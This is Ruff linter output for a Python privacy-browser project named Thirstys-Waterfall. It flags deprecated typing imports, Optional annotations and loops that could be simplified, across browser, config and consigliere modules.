UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\browser\browser_engine.py:28:32
   |
26 |     """
27 |
28 |     def __init__(self, config: Dict[str, Any]):
   |                                ^^^^
29 |         self.config = config
30 |         self.logger = logging.getLogger(__name__)
   |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
   --> external\Thirstys-Waterfall\thirstys_waterfall\browser\browser_engine.py:139:31
    |
137 |         return True
138 |
139 |     def create_tab(self, url: Optional[str] = None) -> str:
    |                               ^^^^^^^^^^^^^
140 |         """
141 |         Create new isolated tab.
    |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
   --> external\Thirstys-Waterfall\thirstys_waterfall\browser\browser_engine.py:216:55
    |
214 |             return False
215 |
216 |     def download_file(self, url: str, tab_id: str) -> Optional[str]:
    |                                                       ^^^^^^^^^^^^^
217 |         """
218 |         Download file with isolation.
    |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\browser\browser_engine.py:231:52
    |
229 |         return None
230 |
231 |     def get_fingerprint_protection_status(self) -> Dict[str, Any]:
    |                                                    ^^^^
232 |         """Get fingerprint protection status"""
233 |         return {
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\browser\browser_engine.py:245:37
    |
243 |         }
244 |
245 |     def search(self, query: str) -> Dict[str, Any]:
    |                                     ^^^^
246 |         """
247 |         Perform encrypted search.
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\browser\browser_engine.py:255:29
    |
253 |         return self.encrypted_search.search(query)
254 |
255 |     def get_status(self) -> Dict[str, Any]:
    |                             ^^^^
256 |         """Get browser status"""
257 |         return {
    |
help: Replace with `dict`

UP035 `typing.List` is deprecated, use `list` instead
 --> external\Thirstys-Waterfall\thirstys_waterfall\browser\content_blocker.py:5:1
  |
3 | import logging
4 | import re
5 | from typing import List, Set
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  |

UP035 `typing.Set` is deprecated, use `set` instead
 --> external\Thirstys-Waterfall\thirstys_waterfall\browser\content_blocker.py:5:1
  |
3 | import logging
4 | import re
5 | from typing import List, Set
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  |

UP006 [*] Use `set` instead of `Set` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\browser\content_blocker.py:44:32
   |
42 |         self.logger = logging.getLogger(__name__)
43 |
44 |         self._tracker_domains: Set[str] = set()
   |                                ^^^
45 |         self._ad_domains: Set[str] = set()
46 |         self._malicious_patterns: List[str] = []
   |
help: Replace with `set`

UP006 [*] Use `set` instead of `Set` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\browser\content_blocker.py:45:27
   |
44 |         self._tracker_domains: Set[str] = set()
45 |         self._ad_domains: Set[str] = set()
   |                           ^^^
46 |         self._malicious_patterns: List[str] = []
47 |         self._blocked_count = 0
   |
help: Replace with `set`

UP006 [*] Use `list` instead of `List` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\browser\content_blocker.py:46:35
   |
44 |         self._tracker_domains: Set[str] = set()
45 |         self._ad_domains: Set[str] = set()
46 |         self._malicious_patterns: List[str] = []
   |                                   ^^^^
47 |         self._blocked_count = 0
48 |         self._popup_count = 0
   |
help: Replace with `list`

SIM110 Use `return any(domain in url for domain in self._tracker_domains)` instead of `for` loop
   --> external\Thirstys-Waterfall\thirstys_waterfall\browser\content_blocker.py:183:9
    |
181 |       def _is_tracker(self, url: str) -> bool:
182 |           """Check if URL is a known tracker"""
183 | /         for domain in self._tracker_domains:
184 | |             if domain in url:
185 | |                 return True
186 | |         return False
    | |____________________^
187 |
188 |       def _is_malicious(self, url: str) -> bool:
    |
help: Replace with `return any(domain in url for domain in self._tracker_domains)`

SIM110 Use `return any(pattern in url.lower() for pattern in suspicious)` instead of `for` loop
   --> external\Thirstys-Waterfall\thirstys_waterfall\browser\content_blocker.py:199:9
    |
197 |           ]
198 |
199 | /         for pattern in suspicious:
200 | |             if pattern in url.lower():
201 | |                 return True
202 | |
203 | |         return False
    | |____________________^
204 |
205 |       def _contains_popup_code(self, content: str) -> bool:
    |
help: Replace with `return any(pattern in url.lower() for pattern in suspicious)`

SIM110 Use `return any(domain in url for domain in self._ad_domains)` instead of `for` loop
   --> external\Thirstys-Waterfall\thirstys_waterfall\browser\content_blocker.py:323:9
    |
321 |       def _is_ad(self, url: str) -> bool:
322 |           """Check if URL is a known ad domain"""
323 | /         for domain in self._ad_domains:
324 | |             if domain in url:
325 | |                 return True
326 | |         return False
    | |____________________^
327 |
328 |       def block_popup(self) -> bool:
    |
help: Replace with `return any(domain in url for domain in self._ad_domains)`

UP035 `typing.Dict` is deprecated, use `dict` instead
 --> external\Thirstys-Waterfall\thirstys_waterfall\browser\encrypted_navigation.py:6:1
  |
4 | import logging
5 | import time
6 | from typing import Any, Dict, List
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
7 |
8 | from cryptography.fernet import Fernet
  |

UP035 `typing.List` is deprecated, use `list` instead
 --> external\Thirstys-Waterfall\thirstys_waterfall\browser\encrypted_navigation.py:6:1
  |
4 | import logging
5 | import time
6 | from typing import Any, Dict, List
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
7 |
8 | from cryptography.fernet import Fernet
  |

UP006 [*] Use `list` instead of `List` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\browser\encrypted_navigation.py:23:34
   |
22 |         # All URLs encrypted
23 |         self._encrypted_history: List[Dict[str, Any]] = []
   |                                  ^^^^
24 |
25 |         # Encrypted bookmarks
   |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\browser\encrypted_navigation.py:23:39
   |
22 |         # All URLs encrypted
23 |         self._encrypted_history: List[Dict[str, Any]] = []
   |                                       ^^^^
24 |
25 |         # Encrypted bookmarks
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\browser\encrypted_navigation.py:26:36
   |
25 |         # Encrypted bookmarks
26 |         self._encrypted_bookmarks: Dict[str, bytes] = {}
   |                                    ^^^^
27 |
28 |     def start(self):
   |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\browser\encrypted_navigation.py:70:40
   |
68 |         self.logger.debug(f"Recorded encrypted navigation: {url_hash}")
69 |
70 |     def get_encrypted_history(self) -> List[Dict[str, Any]]:
   |                                        ^^^^
71 |         """
72 |         Get encrypted history.
   |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\browser\encrypted_navigation.py:70:45
   |
68 |         self.logger.debug(f"Recorded encrypted navigation: {url_hash}")
69 |
70 |     def get_encrypted_history(self) -> List[Dict[str, Any]]:
   |                                             ^^^^
71 |         """
72 |         Get encrypted history.
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\browser\encrypted_navigation.py:102:42
    |
100 |         self.logger.debug(f"Added encrypted bookmark: {name_hash[:16]}")
101 |
102 |     def get_encrypted_bookmarks(self) -> Dict[str, bytes]:
    |                                          ^^^^
103 |         """Get all encrypted bookmarks"""
104 |         return self._encrypted_bookmarks.copy()
    |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\browser\encrypted_navigation.py:111:67
    |
109 |         self._encrypted_history.clear()
110 |
111 |     def search_encrypted_history(self, encrypted_query: bytes) -> List[Dict[str, Any]]:
    |                                                                   ^^^^
112 |         """
113 |         Search through encrypted history.
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\browser\encrypted_navigation.py:111:72
    |
109 |         self._encrypted_history.clear()
110 |
111 |     def search_encrypted_history(self, encrypted_query: bytes) -> List[Dict[str, Any]]:
    |                                                                        ^^^^
112 |         """
113 |         Search through encrypted history.
    |
help: Replace with `dict`

UP035 `typing.Dict` is deprecated, use `dict` instead
 --> external\Thirstys-Waterfall\thirstys_waterfall\browser\encrypted_search.py:6:1
  |
4 | import logging
5 | import time
6 | from typing import Any, Dict
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
7 |
8 | from cryptography.fernet import Fernet
  |

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\browser\encrypted_search.py:27:32
   |
25 |         # Encrypted cache (query_hash -> encrypted results)
26 |         # Use hash as key since Fernet encryption is non-deterministic
27 |         self._encrypted_cache: Dict[str, bytes] = {}
   |                                ^^^^
28 |
29 |     def start(self):
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\browser\encrypted_search.py:41:37
   |
39 |         self._active = False
40 |
41 |     def search(self, query: str) -> Dict[str, Any]:
   |                                     ^^^^
42 |         """
43 |         Perform encrypted search.
   |
help: Replace with `dict`

UP035 `typing.Dict` is deprecated, use `dict` instead
 --> external\Thirstys-Waterfall\thirstys_waterfall\browser\sandbox.py:4:1
  |
3 | import logging
4 | from typing import Any, Dict
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  |

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\browser\sandbox.py:36:32
   |
34 |     """
35 |
36 |     def __init__(self, config: Dict[str, Any] = None):
   |                                ^^^^
37 |         """Initialize sandbox
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\browser\sandbox.py:103:52
    |
101 |         # In production, would set actual OS-level sandbox policies
102 |
103 |     def execute_script(self, script: str, context: Dict[str, Any]) -> Any:
    |                                                    ^^^^
104 |         """
105 |         Execute script in sandboxed context.
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\browser\sandbox.py:151:31
    |
149 |         return self._active
150 |
151 |     def get_policies(self) -> Dict[str, bool]:
    |                               ^^^^
152 |         """Get sandbox policies"""
153 |         return self._sandbox_policies.copy()
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\browser\sandbox.py:155:38
    |
153 |         return self._sandbox_policies.copy()
154 |
155 |     def get_resource_limits(self) -> Dict[str, int]:
    |                                      ^^^^
156 |         """
157 |         Get current resource limits.
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\browser\sandbox.py:180:42
    |
178 |         return limits
179 |
180 |     def get_security_boundaries(self) -> Dict[str, bool]:
    |                                          ^^^^
181 |         """
182 |         Get security boundary configuration.
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\browser\sandbox.py:207:39
    |
205 |         return boundaries
206 |
207 |     def check_resource_usage(self) -> Dict[str, Any]:
    |                                       ^^^^
208 |         """
209 |         Check current resource usage against limits.
    |
help: Replace with `dict`

UP035 `typing.Dict` is deprecated, use `dict` instead
 --> external\Thirstys-Waterfall\thirstys_waterfall\browser\tab_manager.py:5:1
  |
3 | import logging
4 | import uuid
5 | from typing import Any, Dict, List, Optional
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  |

UP035 `typing.List` is deprecated, use `list` instead
 --> external\Thirstys-Waterfall\thirstys_waterfall\browser\tab_manager.py:5:1
  |
3 | import logging
4 | import uuid
5 | from typing import Any, Dict, List, Optional
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  |

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\browser\tab_manager.py:33:32
   |
31 |     """
32 |
33 |     def __init__(self, config: Dict[str, Any] = None):
   |                                ^^^^
34 |         """Initialize TabManager
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\browser\tab_manager.py:45:21
   |
43 |         self.max_tabs = config.get("max_tabs", 100)
44 |         self.logger = logging.getLogger(__name__)
45 |         self._tabs: Dict[str, Dict[str, Any]] = {}
   |                     ^^^^
46 |         self._active = False
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\browser\tab_manager.py:45:31
   |
43 |         self.max_tabs = config.get("max_tabs", 100)
44 |         self.logger = logging.getLogger(__name__)
45 |         self._tabs: Dict[str, Dict[str, Any]] = {}
   |                               ^^^^
46 |         self._active = False
   |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
  --> external\Thirstys-Waterfall\thirstys_waterfall\browser\tab_manager.py:78:31
   |
76 |         self.logger.info("TabManager stopped")
77 |
78 |     def create_tab(self, url: Optional[str] = None) -> Optional[str]:
   |                               ^^^^^^^^^^^^^
79 |         """
80 |         Create new isolated tab.
   |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
  --> external\Thirstys-Waterfall\thirstys_waterfall\browser\tab_manager.py:78:56
   |
76 |         self.logger.info("TabManager stopped")
77 |
78 |     def create_tab(self, url: Optional[str] = None) -> Optional[str]:
   |                                                        ^^^^^^^^^^^^^
79 |         """
80 |         Create new isolated tab.
   |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\browser\tab_manager.py:151:28
    |
149 |         return True
150 |
151 |     def list_tabs(self) -> Dict[str, Dict[str, Any]]:
    |                            ^^^^
152 |         """
153 |         List all tabs with their metadata.
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\browser\tab_manager.py:151:38
    |
149 |         return True
150 |
151 |     def list_tabs(self) -> Dict[str, Dict[str, Any]]:
    |                                      ^^^^
152 |         """
153 |         List all tabs with their metadata.
    |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
   --> external\Thirstys-Waterfall\thirstys_waterfall\browser\tab_manager.py:169:39
    |
167 |         return {tab_id: tab.copy() for tab_id, tab in self._tabs.items()}
168 |
169 |     def get_tab(self, tab_id: str) -> Optional[Dict[str, Any]]:
    |                                       ^^^^^^^^^^^^^^^^^^^^^^^^
170 |         """Get tab information"""
171 |         return self._tabs.get(tab_id)
    |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\browser\tab_manager.py:169:48
    |
167 |         return {tab_id: tab.copy() for tab_id, tab in self._tabs.items()}
168 |
169 |     def get_tab(self, tab_id: str) -> Optional[Dict[str, Any]]:
    |                                                ^^^^
170 |         """Get tab information"""
171 |         return self._tabs.get(tab_id)
    |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\browser\tab_manager.py:173:31
    |
171 |         return self._tabs.get(tab_id)
172 |
173 |     def get_all_tabs(self) -> List[Dict[str, Any]]:
    |                               ^^^^
174 |         """Get all tabs"""
175 |         return list(self._tabs.values())
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\browser\tab_manager.py:173:36
    |
171 |         return self._tabs.get(tab_id)
172 |
173 |     def get_all_tabs(self) -> List[Dict[str, Any]]:
    |                                    ^^^^
174 |         """Get all tabs"""
175 |         return list(self._tabs.values())
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\browser\tab_manager.py:177:51
    |
175 |         return list(self._tabs.values())
176 |
177 |     def set_tab_config(self, tab_id: str, config: Dict[str, Any]):
    |                                                   ^^^^
178 |         """Set tab configuration"""
179 |         if tab_id in self._tabs:
    |
help: Replace with `dict`

UP035 `typing.Dict` is deprecated, use `dict` instead
  --> external\Thirstys-Waterfall\thirstys_waterfall\config\registry.py:9:1
   |
 7 | import os
 8 | import threading
 9 | from typing import Any, Dict, Optional
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
10 |
11 | from cryptography.fernet import Fernet
   |

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\config\registry.py:34:27
   |
32 |     def __init__(self):
33 |         if not hasattr(self, "initialized"):
34 |             self._config: Dict[str, Any] = {}
   |                           ^^^^
35 |             self._encrypted_config: Dict[str, bytes] = {}
36 |             self._cipher: Optional[Fernet] = None
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\config\registry.py:35:37
   |
33 |         if not hasattr(self, "initialized"):
34 |             self._config: Dict[str, Any] = {}
35 |             self._encrypted_config: Dict[str, bytes] = {}
   |                                     ^^^^
36 |             self._cipher: Optional[Fernet] = None
37 |             self._observers: Dict[str, list] = {}
   |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
  --> external\Thirstys-Waterfall\thirstys_waterfall\config\registry.py:36:27
   |
34 |             self._config: Dict[str, Any] = {}
35 |             self._encrypted_config: Dict[str, bytes] = {}
36 |             self._cipher: Optional[Fernet] = None
   |                           ^^^^^^^^^^^^^^^^
37 |             self._observers: Dict[str, list] = {}
38 |             self.initialized = True
   |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\config\registry.py:37:30
   |
35 |             self._encrypted_config: Dict[str, bytes] = {}
36 |             self._cipher: Optional[Fernet] = None
37 |             self._observers: Dict[str, list] = {}
   |                              ^^^^
38 |             self.initialized = True
   |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
  --> external\Thirstys-Waterfall\thirstys_waterfall\config\registry.py:41:28
   |
40 |     def initialize(
41 |         self, config_path: Optional[str] = None, encryption_key: Optional[bytes] = None
   |                            ^^^^^^^^^^^^^
42 |     ):
43 |         """
   |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
  --> external\Thirstys-Waterfall\thirstys_waterfall\config\registry.py:41:66
   |
40 |     def initialize(
41 |         self, config_path: Optional[str] = None, encryption_key: Optional[bytes] = None
   |                                                                  ^^^^^^^^^^^^^^^
42 |     ):
43 |         """
   |
help: Convert to `X | None`

UP015 [*] Unnecessary mode argument
  --> external\Thirstys-Waterfall\thirstys_waterfall\config\registry.py:54:36
   |
53 |         if config_path and os.path.exists(config_path):
54 |             with open(config_path, "r") as f:
   |                                    ^^^
55 |                 self._config = json.load(f)
56 |         else:
   |
help: Remove mode argument

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\config\registry.py:171:44
    |
169 |                 self._notify_observers(key, value)
170 |
171 |     def get_section(self, section: str) -> Dict[str, Any]:
    |                                            ^^^^
172 |         """Get entire configuration section"""
173 |         return self._config.get(section, {})
    |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
   --> external\Thirstys-Waterfall\thirstys_waterfall\config\registry.py:182:42
    |
180 |         self._encrypted_config[key] = self._cipher.encrypt(value.encode())
181 |
182 |     def get_encrypted(self, key: str) -> Optional[str]:
    |                                          ^^^^^^^^^^^^^
183 |         """Retrieve and decrypt configuration value"""
184 |         if not self._cipher or key not in self._encrypted_config:
    |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\config\registry.py:209:32
    |
207 |             json.dump(self._config, f, indent=2)
208 |
209 |     def export_config(self) -> Dict[str, Any]:
    |                                ^^^^
210 |         """Export full configuration"""
211 |         return self._config.copy()
    |
help: Replace with `dict`

UP035 `typing.Dict` is deprecated, use `dict` instead
 --> external\Thirstys-Waterfall\thirstys_waterfall\config\validator.py:4:1
  |
3 | import re
4 | from typing import Any, Dict, List
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  |

UP035 `typing.List` is deprecated, use `list` instead
 --> external\Thirstys-Waterfall\thirstys_waterfall\config\validator.py:4:1
  |
3 | import re
4 | from typing import Any, Dict, List
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  |

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\config\validator.py:17:26
   |
16 |     @staticmethod
17 |     def validate(config: Dict[str, Any]) -> tuple[bool, List[str]]:
   |                          ^^^^
18 |         """
19 |         Validate configuration structure and values.
   |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\config\validator.py:17:57
   |
16 |     @staticmethod
17 |     def validate(config: Dict[str, Any]) -> tuple[bool, List[str]]:
   |                                                         ^^^^
18 |         """
19 |         Validate configuration structure and values.
   |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\config\validator.py:54:34
   |
53 |     @staticmethod
54 |     def _validate_global(config: Dict[str, Any]) -> List[str]:
   |                                  ^^^^
55 |         """Validate global configuration"""
56 |         errors = []
   |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\config\validator.py:54:53
   |
53 |     @staticmethod
54 |     def _validate_global(config: Dict[str, Any]) -> List[str]:
   |                                                     ^^^^
55 |         """Validate global configuration"""
56 |         errors = []
   |
help: Replace with `list`

SIM102 Use a single `if` statement instead of nested `if` statements
  --> external\Thirstys-Waterfall\thirstys_waterfall\config\validator.py:58:9
   |
56 |           errors = []
57 |
58 | /         if "privacy_mode" in config:
59 | |             if config["privacy_mode"] not in ConfigValidator.VALID_PRIVACY_MODES:
   | |_________________________________________________________________________________^
60 |                   errors.append(f"Invalid privacy_mode: {config['privacy_mode']}")
   |
help: Combine `if` statements using `and`

SIM102 Use a single `if` statement instead of nested `if` statements
  --> external\Thirstys-Waterfall\thirstys_waterfall\config\validator.py:62:9
   |
60 |                   errors.append(f"Invalid privacy_mode: {config['privacy_mode']}")
61 |
62 | /         if "log_level" in config:
63 | |             if config["log_level"] not in ConfigValidator.VALID_LOG_LEVELS:
   | |___________________________________________________________________________^
64 |                   errors.append(f"Invalid log_level: {config['log_level']}")
   |
help: Combine `if` statements using `and`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\config\validator.py:69:37
   |
68 |     @staticmethod
69 |     def _validate_firewalls(config: Dict[str, Any]) -> List[str]:
   |                                     ^^^^
70 |         """Validate firewall configurations"""
71 |         errors = []
   |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\config\validator.py:69:56
   |
68 |     @staticmethod
69 |     def _validate_firewalls(config: Dict[str, Any]) -> List[str]:
   |                                                        ^^^^
70 |         """Validate firewall configurations"""
71 |         errors = []
   |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\config\validator.py:91:31
   |
90 |     @staticmethod
91 |     def _validate_vpn(config: Dict[str, Any]) -> List[str]:
   |                               ^^^^
92 |         """Validate VPN configuration"""
93 |         errors = []
   |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\config\validator.py:91:50
   |
90 |     @staticmethod
91 |     def _validate_vpn(config: Dict[str, Any]) -> List[str]:
   |                                                  ^^^^
92 |         """Validate VPN configuration"""
93 |         errors = []
   |
help: Replace with `list`

SIM102 Use a single `if` statement instead of nested `if` statements
  --> external\Thirstys-Waterfall\thirstys_waterfall\config\validator.py:95:9
   |
93 |           errors = []
94 |
95 | /         if "hop_count" in config:
96 | |             if not isinstance(config["hop_count"], int) or config["hop_count"] < 1:
   | |___________________________________________________________________________________^
97 |                   errors.append("hop_count must be positive integer")
   |
help: Combine `if` statements using `and`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\config\validator.py:107:35
    |
106 |     @staticmethod
107 |     def _validate_browser(config: Dict[str, Any]) -> List[str]:
    |                                   ^^^^
108 |         """Validate browser configuration"""
109 |         errors = []
    |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\config\validator.py:107:54
    |
106 |     @staticmethod
107 |     def _validate_browser(config: Dict[str, Any]) -> List[str]:
    |                                                      ^^^^
108 |         """Validate browser configuration"""
109 |         errors = []
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\config\validator.py:124:35
    |
123 |     @staticmethod
124 |     def _validate_privacy(config: Dict[str, Any]) -> List[str]:
    |                                   ^^^^
125 |         """Validate privacy configuration"""
126 |         errors = []
    |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\config\validator.py:124:54
    |
123 |     @staticmethod
124 |     def _validate_privacy(config: Dict[str, Any]) -> List[str]:
    |                                                      ^^^^
125 |         """Validate privacy configuration"""
126 |         errors = []
    |
help: Replace with `list`

UP035 `typing.Dict` is deprecated, use `dict` instead
 --> external\Thirstys-Waterfall\thirstys_waterfall\consigliere\action_ledger.py:7:1
  |
5 | import logging
6 | import time
7 | from typing import Any, Dict, List
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
8 |
9 | from cryptography.fernet import Fernet
  |

UP035 `typing.List` is deprecated, use `list` instead
 --> external\Thirstys-Waterfall\thirstys_waterfall\consigliere\action_ledger.py:7:1
  |
5 | import logging
6 | import time
7 | from typing import Any, Dict, List
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
8 |
9 | from cryptography.fernet import Fernet
  |

UP006 [*] Use `list` instead of `List` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\consigliere\action_ledger.py:19:24
   |
17 |         self._cipher = cipher
18 |         self._max_entries = max_entries
19 |         self._entries: List[Dict[str, Any]] = []
   |                        ^^^^
20 |         self._entry_counter = 0
   |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\consigliere\action_ledger.py:19:29
   |
17 |         self._cipher = cipher
18 |         self._max_entries = max_entries
19 |         self._entries: List[Dict[str, Any]] = []
   |                             ^^^^
20 |         self._entry_counter = 0
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\consigliere\action_ledger.py:22:47
   |
20 |         self._entry_counter = 0
21 |
22 |     def add_entry(self, action: str, details: Dict[str, Any]):
   |                                               ^^^^
23 |         """Add an action to the ledger (encrypted)"""
24 |         entry = {
   |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\consigliere\action_ledger.py:40:62
   |
38 |         self.logger.debug(f"Ledger entry added: {action}")
39 |
40 |     def get_entries(self, include_redacted: bool = False) -> List[Dict[str, Any]]:
   |                                                              ^^^^
41 |         """Get all ledger entries"""
42 |         if include_redacted:
   |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\consigliere\action_ledger.py:40:67
   |
38 |         self.logger.debug(f"Ledger entry added: {action}")
39 |
40 |     def get_entries(self, include_redacted: bool = False) -> List[Dict[str, Any]]:
   |                                                                   ^^^^
41 |         """Get all ledger entries"""
42 |         if include_redacted:
   |
help: Replace with `dict`

UP035 `typing.Dict` is deprecated, use `dict` instead
 --> external\Thirstys-Waterfall\thirstys_waterfall\consigliere\capability_manager.py:7:1
  |
5 | import logging
6 | import time
7 | from typing import Any, Dict
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
8 |
9 | from cryptography.fernet import Fernet
  |

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\consigliere\capability_manager.py:84:55
   |
82 |         return True
83 |
84 |     def get_capability_info(self, capability: str) -> Dict[str, Any]:
   |                                                       ^^^^
85 |         """Get information about a capability"""
86 |         return self.capabilities.get(capability, {})
   |
help: Replace with `dict`

UP035 `typing.Dict` is deprecated, use `dict` instead
  --> external\Thirstys-Waterfall\thirstys_waterfall\consigliere\consigliere_engine.py:8:1
   |
 6 | import logging
 7 | import time
 8 | from typing import Any, Dict, List, Optional
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
 9 |
10 | from cryptography.fernet import Fernet
   |

UP035 `typing.List` is deprecated, use `list` instead
  --> external\Thirstys-Waterfall\thirstys_waterfall\consigliere\consigliere_engine.py:8:1
   |
 6 | import logging
 7 | import time
 8 | from typing import Any, Dict, List, Optional
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
 9 |
10 | from cryptography.fernet import Fernet
   |

